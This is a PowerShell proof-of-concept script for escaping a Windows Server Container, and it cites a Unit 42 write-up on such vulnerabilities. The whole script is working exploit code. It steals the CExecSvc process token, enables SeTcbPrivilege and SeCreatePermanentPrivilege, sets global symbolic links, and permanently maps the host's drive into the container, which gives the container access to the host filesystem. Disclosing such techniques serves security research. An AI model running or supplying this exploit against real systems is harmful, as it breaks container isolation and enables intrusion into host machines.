Param(
    [Parameter(Mandatory, Position = 0)]
    [string]$HostDrive,
    [Parameter(Mandatory, Position = 1)]
    [string]$LocalDrive
)

# Script to map a host drive inside a Windows Docker Server Container
# You need to be an admin in the container for this to work.
# Use as .\map_host_drive C: X:
# More information from @danie1zy https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/

Import-Module NtObjectManager -ErrorAction Ignore
$token = Get-NtTokenFromProcess -ProcessId (Get-Process "CExecSvc").Id
Set-NtTokenPrivilege -Privilege SeTcbPrivilege,SeCreatePermanentPrivilege -Token $token
# Get the host drive's device path.
$target = Use-NtObject($s = New-NtSymbolicLink "\??\ROOT" "" -Access Set) {
    Invoke-NtToken -Token $token { $s.SetGlobalLink() }
    Get-NtSymbolicLinkTarget "\??\ROOT\GLOBAL??\$HostDrive"
}

Write-Host "Host $HostDrive drive is $target"
# Map the host drive to the local drive.
Use-NtObject($s = New-NtSymbolicLink "\??\$LocalDrive" $target -Access Set) {
    Invoke-NtToken -Token $token { 
        $s.SetGlobalLink() 
        $s.MakePermanent()
    }
}